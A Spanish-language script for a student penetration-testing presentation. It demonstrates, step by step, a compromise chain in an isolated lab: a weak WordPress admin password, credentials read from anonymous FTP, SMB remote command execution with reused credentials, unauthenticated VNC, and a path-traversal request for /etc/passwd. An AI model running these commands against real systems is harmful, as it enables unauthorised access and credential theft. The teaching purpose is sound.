# 10. Guion de sustentación y livecoding

**Duración objetivo:** 8–10 minutos.
**Regla:** una idea por comando; nada de `nmap -p-`, módulos MSF ni PoCs largos. Los comandos completos están en la bitácora; aquí solo se teclea lo que se ve.

---

## 10.1 Diapositiva previa (obligatoria)

> **Qué se va a mostrar:** cadena de compromiso desde Kali (`10.10.10.20`) hasta la estación del cliente (`10.10.10.15`).
> **Máquinas:** M1 aplicación, M2 base de datos, M3 respaldos, M4 Windows heredado, M5 estación.
> **Qué se espera ver:** versiones vulnerables, login administrativo, credenciales en claro, acceso a Windows y escritorio VNC.
> **Límites:** laboratorio aislado, autorizado, sin daño; los datos son ficticios.

---

## 10.2 Demo mínima (7 comandos)

### 1. Reconocimiento de la puerta

```bash
curl -sI http://wp.uni.lab
```

**Se espera:** `Apache/2.4.49`, `X-Powered-By: PHP/8.4.26`, `WordPress` en el HTML.
**Evidencia:** `F01-003`, `F01-004`.
**Frase:** “La puerta es WordPress 7.0.1 sobre Apache 2.4.49 y PHP 8.4.26: tres versiones del catálogo.”

---

### 2. Ruta de wp2shell (W1)

```bash
curl -s http://wp.uni.lab/wp-json/ | grep -o 'batch[^"]*' | head -1
```

**Se espera:** `batch\/v1`.
**Evidencia:** `F03-001`.
**Frase:** “La ruta del CVE-2026-63030 existe; el PoC completo queda documentado, pero para el demo usamos la credencial débil.”

---

### 3. Acceso administrativo por clave débil (W4)

En el navegador:

```text
http://wp.uni.lab/wp-admin/
usuario: usc.admin
clave:   Admin13.-
```

**Se espera:** panel de WordPress.
**Evidencia:** `F03-001` (302 + cookie).
**Frase:** “La clave está en el escenario y además se reutiliza en SSH; eso convierte un admin web en root de M1.”

Alternativa en terminal (si no hay navegador):

```bash
curl -s -c /tmp/wp.cookies http://wp.uni.lab/wp-login.php -o /dev/null
curl -s -b /tmp/wp.cookies -D - -o /dev/null \
  -d 'log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&testcookie=1' \
  http://wp.uni.lab/wp-login.php | grep -E 'HTTP/|Location:'
```

**Se espera:** `302 Found` + `Location: http://wp.uni.lab/wp-admin/`.

---

### 4. Credenciales en claro en M3 (B3)

```bash
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt
```

**Se espera:** `admin M4/M5: Admin13.-`.
**Evidencia:** `F04-002`.
**Frase:** “El FTP anónimo entrega la clave que abre M4 y M5: el eslabón de la cadena.”

---

### 5. M4 · Administrator → SYSTEM (S3)

```bash
nxc smb 10.10.10.14 -u Administrator -p 'Admin13.-' --shares
nxc smb 10.10.10.14 -u Administrator -p 'Admin13.-' -x whoami
```

**Se espera:** recurso `legacy` y `nt authority\system` (o `administrator`, según el método).
**Evidencia:** `F04-007` (pendiente de M4 encendida).
**Frase:** “La misma clave de los backups abre el Windows heredado; si `-x` devuelve SYSTEM, el privesc está demostrado.”

Si `nxc -x` no funciona, usar:

```bash
smbclient //10.10.10.14/legacy -U 'Administrator%Admin13.-' -c 'ls'
```

---

### 6. M5 · Reúso de clave (C2)

```bash
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' --shares
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' -x whoami
```

**Se espera:** `pc-est01\cliente` o `nt authority\system`.
**Evidencia:** salida 13:08 UTC (SMB por túnel desde M1). La sesión real se demuestra por VNC.
**Frase:** “La estación del usuario usa la misma clave; el factor humano cierra la cadena.”

Si `cliente` no existe, probar `Administrador` o `Administrator`.

---

### 7. M5 · Escritorio por VNC sin clave (C4)

```bash
vncviewer 10.10.10.15
```

**Se espera:** escritorio del cliente sin pedir contraseña.
**Evidencia:** `F04-009` (escritorio), `F04-011` (`whoami`), `F05-001` (marcador).
**Frase:** “No hace falta exploit: el VNC está sin autenticación. Control gráfico total.”

Si el firewall se corrige antes de la demo, usar el túnel:

```bash
ssh -L 5900:10.10.10.15:5900 ubuntu@10.10.10.11 -N
vncviewer 127.0.0.1:5900
```

---

## 10.3 Retest (3 comandos)

```bash
# W1/W3: versión y traversal cerrados
wp core version
curl -s -o /dev/null -w '%{http_code}\n' \
  --path-as-is 'http://wp.uni.lab/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# D1: Redis exige contraseña
redis-cli -h 10.10.10.12 PING

# C4: VNC exige autenticación
nmap --script vnc-info -p 5900 10.10.10.15
```

**Se espera:** `7.0.2`, `403`, `NOAUTH`, `Authentication: VNC`.

---

## 10.4 Plan B si una VM no está encendida

| Falla | Plan B |
|---|---|
| M4 apagada | Mostrar `F02-001` (445 abierto) y `F04-002` (credencial); explicar que el acceso está pendiente y que la clave `Admin13.-` no autenticó |
| M5 VNC no conecta | Mostrar `F04-008` (auth None), `F04-009` (escritorio), `F04-011` (`whoami`) y `F05-001` (marcador) |
| W4 no abre el panel | Usar el `curl` de 302 + cookie (`F03-001`) |
| VNC no conecta | `nmap --script vnc-info` y mostrar `Authentication: None` |
| `nxc` falla | `smbclient` con la misma credencial |

---

## 10.5 Reparto de la exposición

| Minuto | Quién | Qué |
|---|---|---|
| 0–1 | Coordinador | Escenario, arquitectura y alcance |
| 1–2 | M6 | Reconocimiento y modelo de red |
| 2–3 | M1 | WordPress, W1/W4 y credenciales |
| 3–4 | M2 | Redis y base de datos |
| 4–5 | M3 | FTP anónimo y NFS |
| 5–7 | M4 | Administrator → SYSTEM |
| 7–8 | M5 | Reúso de clave y VNC |
| 8–10 | Todos | Mitigación, retest y conclusiones |

---

## 10.6 Frases de cierre

- “El alcance no se logró por un solo exploit, sino por **encadenar** credenciales y configuraciones débiles.”
- “Cada hallazgo tiene **antes y después**: versión, evidencia y retest.”
- “Lo que no se pudo explotar se documenta como limitación; no se inventa.”
